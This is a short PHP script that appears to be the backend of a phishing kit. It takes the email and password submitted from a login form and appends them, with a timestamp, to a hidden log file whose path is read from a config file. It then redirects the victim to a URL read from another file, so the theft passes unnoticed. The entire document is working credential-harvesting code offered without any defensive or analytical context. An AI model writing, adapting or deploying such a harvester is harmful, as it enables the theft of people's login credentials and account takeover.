<?php 
session_start();
$name=$_REQUEST['email'];
$password=$_REQUEST['pass'];
$myfile = fopen("../../data/out.txt", "r") or die("Unable to open file!");
$path=fread($myfile,filesize("../../data/out.txt")); // out file reffer for where username and password saved
fclose($myfile);
$fp = fopen($path, 'a');
$date_today = "\n".date("Y/m/d").'_'.date("h:i:sa");
fwrite($fp, $date_today."\n");
fwrite($fp, 'Username > '.$name."\n");
fwrite($fp, 'Password > '.$password."\n");
fclose($fp);
$myfile = fopen("../../data/url.txt", "r") or die("Unable to open file!");
$url=fread($myfile,filesize("../../data/url.txt")); // url read
fclose($myfile);
$url = "Location:".$url;
header($url);
?>